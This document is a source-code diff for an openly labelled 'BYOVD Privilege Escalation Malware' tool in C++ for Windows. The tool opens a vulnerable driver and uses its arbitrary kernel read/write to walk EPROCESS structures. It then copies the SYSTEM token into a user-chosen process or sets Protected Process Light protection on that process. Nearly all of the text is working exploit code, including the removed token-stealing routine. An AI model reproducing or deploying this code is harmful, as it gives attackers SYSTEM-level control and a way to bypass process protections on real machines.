@@ -3,19 +3,23 @@
 
 #include <stdlib.h>
 
-#include "driverOps.h"
-#include "myIO.hpp"
-#include "NT_Definitions.h"
+
+#include "functions.h"
 
 
 #define PATH_TO_DRIVER L"\\\\.\\GIO"
-
-void print_banner() {
+void print_banner_BYOVD() {
     std::string S = R"(
     _____  ______ _   _____               
    / _ ) \/ / __ \ | / / _ \              
   / _  |\  / /_/ / |/ / // /              
  /____/ /_/\____/|___/____/     
+    )";
+    std::cout << S << std::endl;
+}
+
+void print_banner_LPE() {
+    std::string S = R"(
     ___      _      _ __
    / _ \____(_)  __(_) /__ ___ ____       
   / ___/ __/ / |/ / / / -_) _ `/ -_)      
@@ -31,141 +35,132 @@ void print_banner() {
     std::cout << "BYOVD Privilege Escalation Malware by MM\n" << std::endl;
 }
 
-bool EnablePrivilege(PCWSTR name) 
-{
-    HANDLE hToken;
-    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
-        return false;
+void print_banner_PPL() {
+    std::string S = R"(
 
-    LUID luid;
-    bool result = false;
-    if (LookupPrivilegeValue(nullptr, name, &luid)){
-        TOKEN_PRIVILEGES tp;
-        tp.PrivilegeCount = 1;
-        tp.Privileges[0].Luid = luid;
-        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+                                          
+)";
 
-        if (AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), nullptr, nullptr)) {
-            result = GetLastError() == ERROR_SUCCESS;
-        }
-    }
-
-    CloseHandle(hToken);
-    return result;
+    std::cout << S << std::endl;
+    std::cout << "BYOVD PPL byPass Malware by MM\n" << std::endl;
 }
 
-int getEPROCESSES(_In_ DriverOps * driver, _Out_ DWORD64* systemProcess, _Out_ DWORD64* targetProcess, _In_ const PVOID ImageBase, _In_ const ULONG64 targetPID)
-{
-    KernelReadWrite krw = { 0 };
-
-    DWORD64 currentProcess = 0;
-    krw.src = (LPVOID)((ULONG64)ImageBase + g_offsets.PsInitialSystemProcess);
-    krw.dst = (LPVOID)(&currentProcess);
-    krw.size = sizeof(DWORD64);
-    if(!driver->arbitraryRW(&krw)) {
-        return 3;
-    }
-
-    DWORD64 currentProcessListAddress = currentProcess + g_offsets.ActiveProcessLinks;
-    DWORD64 HeadListAddress = currentProcessListAddress;
-
-    int safety_couter = 0;
-    bool systemProcessAchieved = FALSE;
-    bool targetProcessAchieved = FALSE;
-
-    while(1)
-    {
-        ULONG64 PID = 0;
-        krw.src = (LPVOID)(currentProcess + g_offsets.UniqueProcessId);
-        krw.dst = (LPVOID)(&PID);
-        krw.size = sizeof(ULONG64);
-        if (!driver->arbitraryRW(&krw)) {
-            return 3;
-        }
-
-        if (PID == 4) {
-            *systemProcess = currentProcess;
-            systemProcessAchieved = TRUE;
-        }
-        else if (PID == targetPID) {
-            *targetProcess = currentProcess;
-            targetProcessAchieved = TRUE;
-        }
-
-
-        _LIST_ENTRY activeProcessLinks;
-        krw.src = (LPVOID)currentProcessListAddress;
-        krw.dst = (LPVOID)(&activeProcessLinks);
-        krw.size = sizeof(_LIST_ENTRY);
-        if(!driver->arbitraryRW(&krw)) {
-            return 3;
-        }
-
-        DWORD64 nextAPLAddress = (DWORD64)activeProcessLinks.Flink;
-        DWORD64 nextProcess = nextAPLAddress - g_offsets.ActiveProcessLinks;
-
-        currentProcess = nextProcess;
-        currentProcessListAddress = nextAPLAddress;
-
-        if (targetProcessAchieved && systemProcessAchieved) return 0;
-        if (HeadListAddress == currentProcessListAddress)   return 1;
-        if (safety_couter++ > 5000)                         return 2;
-    }
-}
-
-bool stealToken(_In_ DriverOps* driver, _In_ DWORD64 systemProcess, _In_ DWORD64 targetProcess)
-{
-    KernelReadWrite krw = { 0 };
-    krw.src = (LPVOID)(systemProcess + g_offsets.Token);
-    krw.dst = (LPVOID)(targetProcess + g_offsets.Token);
-    krw.size = sizeof(_EX_FAST_REF);
-    return driver->arbitraryRW(&krw);
-}
-
-int main() {
+void do_LPE(DriverOps * driver) {
     try {
-        print_banner();
+        print_banner_LPE();
 
-        print(OutputMode::_INFO, "Malware has started");
-
-        if (!EnablePrivilege(SE_DEBUG_NAME)) {
-            throw std::string{ "Can't enable SeDebugPrivilege!" };
-        }
-        print(OutputMode::_SUCCESS, "SeDebugPivilege enabled!");
-
-        DriverOps driver{};
-        if (driver.openDriver(PATH_TO_DRIVER) == NULL) {
-            throw std::string{ "Cannot open driver!" };
-        }
-        print(OutputMode::_SUCCESS, "Opened and got a handle to vulnerable driver!");
+        print(OutputMode::_INFO, "LPE has started");
 
         RTL_PROCESS_MODULE_INFORMATION ntoskrnlInfo = { 0 };
 
         if (int err_code = NTGetNtoskrnlInfo(&ntoskrnlInfo)) {
             throw std::string{ "Couldn't get ntoskrnl information! Error code: " } + std::to_string(err_code);
         }
+        else if (ntoskrnlInfo.ImageBase == NULL) {
+            throw std::string{ "Couldn't get ntoskrnl information, Pointer is NULL!" };
+        }
+
         print(OutputMode::_SUCCESS, "Got ntoskrnl information!");
         std::cout << "Base Address: " << ntoskrnlInfo.ImageBase << std::endl;
 
         DWORD64 systemProcess;
         DWORD64 targetProcess;
-        ULONG64 targetPID = 2992;
+        ULONG64 targetPID = 0;
 
-        if (int err_code = getEPROCESSES(&driver, &systemProcess, &targetProcess, ntoskrnlInfo.ImageBase, targetPID)) {
+        printf("Provide target PID: ");
+        scanf_s("%lu", &targetPID);
+        if (targetPID <= 4) {
+            throw std::string{ "Incorrect PID" };
+        }
+
+        if (int err_code = getEPROCESSES(driver, &systemProcess, &targetProcess, ntoskrnlInfo.ImageBase, targetPID)) {
             throw std::string{ "Couldn't scrap EProcesses! Error code: " } + std::to_string(err_code);
         }
         print(OutputMode::_SUCCESS, "Got both EProcesses!");
 
-        if (!stealToken(&driver, systemProcess, targetProcess)) {
+        if (!stealToken(driver, systemProcess, targetProcess)) {
             throw std::string{ "Couldn't copy token values to target" };
         }
         print(OutputMode::_SUCCESS, "Successfully copied token value to target!");
 
-        print(OutputMode::_SUCCESS, "LPE Done!");
+        print(OutputMode::_SUCCESS, "PPL Done!");
 
     }
     catch (std::string msg) {
         print(OutputMode::_ERROR, msg);
+    }
+}
+
+void do_PPLbyPass(DriverOps* driver) {
+    try{
+        print_banner_PPL();
+
+        print(OutputMode::_INFO, "PPL has started");
+
+        RTL_PROCESS_MODULE_INFORMATION ntoskrnlInfo = { 0 };
+
+        if (int err_code = NTGetNtoskrnlInfo(&ntoskrnlInfo)) {
+            throw std::string{ "Couldn't get ntoskrnl information! Error code: " } + std::to_string(err_code);
+        }
+        else if (ntoskrnlInfo.ImageBase == NULL) {
+            throw std::string{ "Couldn't get ntoskrnl information, Pointer is NULL!" };
+        }
+
+        print(OutputMode::_SUCCESS, "Got ntoskrnl information!");
+        std::cout << "Base Address: " << ntoskrnlInfo.ImageBase << std::endl;
+
+        DWORD64 systemProcess;
+        DWORD64 targetProcess;
+        ULONG64 targetPID = 0;
+
+        printf("Provide target PID: ");
+        scanf_s("%lu", &targetPID);
+        if (targetPID <= 4) {
+            throw std::string{ "Incorrect PID" };
+        }
+
+        if (int err_code = getEPROCESSES(driver, &systemProcess, &targetProcess, ntoskrnlInfo.ImageBase, targetPID)) {
+            throw std::string{ "Couldn't scrap EProcesses! Error code: " } + std::to_string(err_code);
+        }
+        print(OutputMode::_SUCCESS, "Got both EProcesses!");
+
+        if (!elevatePPL(driver, targetProcess)) {
+            throw std::string{ "Couldn't change protection values to target" };
+        }
+        print(OutputMode::_SUCCESS, "Successfully elevated PPL to target!");
+
+        print(OutputMode::_SUCCESS, "PPL Completed!");
+    }
+    catch (std::string msg) {
+        print(OutputMode::_ERROR, msg);
+    }
+}
+
+int main() {
+    print_banner_BYOVD();
+
+    if (!EnablePrivilege(SE_DEBUG_NAME)) {
+        throw std::string{ "Can't enable SeDebugPrivilege!" };
+    }
+    print(OutputMode::_SUCCESS, "SeDebugPivilege enabled!");
+
+    DriverOps driver{};
+    if (driver.openDriver(PATH_TO_DRIVER) == NULL) {
+        throw std::string{ "Cannot open driver!" };
+    }
+    print(OutputMode::_SUCCESS, "Opened and got a handle to vulnerable driver!");
+
+    printf("\n");
+    print(OutputMode::_INFO, "Choose job:\n 1 - LPE\n 2 - PPL bypass");
+
+    int job = 0;
+    scanf_s("%d", &job);
+
+    if (job == 1) do_LPE(&driver);
+    else if (job == 2) do_PPLbyPass(&driver);
+
+    else {
+        print(OutputMode::_ERROR, "Unexpected value " + std::to_string(job));
     }
 
     std::cout << std::endl << "Press any button to close the window..." << std::endl;
